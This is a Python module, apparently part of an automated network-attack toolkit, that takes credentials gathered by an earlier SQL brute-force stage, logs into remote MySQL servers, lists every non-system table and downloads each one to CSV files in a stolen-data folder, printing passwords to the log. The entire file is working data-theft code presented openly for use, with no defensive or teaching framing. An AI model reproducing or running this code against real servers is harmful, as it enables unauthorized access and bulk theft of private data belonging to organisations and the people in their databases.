import os
import pandas as pd
import logging
import time
from sqlalchemy import create_engine
from rich.console import Console
from threading import Timer
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealDataSQL"
b_module = "steal_data_sql"
b_status = "steal_data_sql"
b_parent = "SQLBruteforce"
b_port = 3306

class StealDataSQL:
    """
    Class to handle the process of stealing data from SQL servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.sql_connected = False
            self.stop_execution = False
            logger.info("StealDataSQL initialized.")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_sql(self, ip, username, password, database=None):
        """
        Establish a MySQL connection using SQLAlchemy.
        """
        try:
            # Si aucune base n'est spécifiée, on se connecte sans base
            db_part = f"/{database}" if database else ""
            connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306{db_part}"
            engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
            self.sql_connected = True
            logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
            return engine
        except Exception as e:
            logger.error(f"SQL connection error for {ip} with user '{username}' and password '{password}'" + (f" to database {database}" if database else "") + f": {e}")
            return None

    def find_tables(self, engine):
        """
        Find all tables in all databases, excluding system databases.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Table search interrupted due to orchestrator exit.")
                return []
            query = """
            SELECT TABLE_NAME, TABLE_SCHEMA 
            FROM INFORMATION_SCHEMA.TABLES 
            WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
            AND TABLE_TYPE = 'BASE TABLE'
            """
            df = pd.read_sql(query, engine)
            tables = df[['TABLE_NAME', 'TABLE_SCHEMA']].values.tolist()
            logger.info(f"Found {len(tables)} tables across all databases")
            return tables
        except Exception as e:
            logger.error(f"Error finding tables: {e}")
            return []

    def steal_data(self, engine, table, schema, local_dir):
        """
        Download data from the table in the database to a local file.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Data stealing process interrupted due to orchestrator exit.")
                return
            query = f"SELECT * FROM {schema}.{table}"
            df = pd.read_sql(query, engine)
            local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
            df.to_csv(local_file_path, index=False)
            logger.success(f"Downloaded data from table {schema}.{table} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading data from table {schema}.{table}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal data from the remote SQL server.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):
                self.shared_data.bjornorch_status = "StealDataSQL"
                time.sleep(5)
                logger.info(f"Stealing data from {ip}:{port}...")

                sqlfile = self.shared_data.sqlfile
                credentials = []
                if os.path.exists(sqlfile):
                    df = pd.read_csv(sqlfile)
                    # Filtrer les credentials pour l'IP spécifique
                    ip_credentials = df[df['IP Address'] == ip]
                    # Créer des tuples (username, password, database)
                    credentials = [(row['User'], row['Password'], row['Database']) 
                                 for _, row in ip_credentials.iterrows()]
                    logger.info(f"Found {len(credentials)} credential combinations for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    if not self.sql_connected:
                        logger.error(f"No SQL connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)
                timer.start()

                success = False
                for username, password, database in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Steal data execution interrupted.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip} on database {database}")
                        # D'abord se connecter sans base pour vérifier les permissions globales
                        engine = self.connect_sql(ip, username, password)
                        if engine:
                            tables = self.find_tables(engine)
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
                            os.makedirs(local_dir, exist_ok=True)
                            
                            if tables:
                                for table, schema in tables:
                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        break
                                    # Se connecter à la base spécifique pour le vol de données
                                    db_engine = self.connect_sql(ip, username, password, schema)
                                    if db_engine:
                                        self.steal_data(db_engine, table, schema, local_dir)
                                success = True
                                counttables = len(tables)
                                logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
                            
                            if success:
                                timer.cancel()
                                return 'success'
                    except Exception as e:
                        logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")

                if not success:
                    logger.error(f"Failed to steal any data from {ip}:{port}")
                    return 'failed'
                else:
                    return 'success'

            else:
                logger.info(f"Skipping {ip} as it was not successfully bruteforced")
                return 'skipped'
                
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

    def b_parent_action(self, row):
        """
        Get the parent action status from the row.
        """
        return row.get(b_parent, {}).get(b_status, '')

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal_data_sql = StealDataSQL(shared_data)
        logger.info("[bold green]Starting SQL data extraction process[/bold green]")
        
        # Load the IPs to process from shared data
        ips_to_process = shared_data.read_data()
        
        # Execute data theft on each IP
        for row in ips_to_process:
            ip = row["IPs"]
            steal_data_sql.execute(ip, b_port, row, b_status)
            
    except Exception as e:
        logger.error(f"Error in main execution: {e}")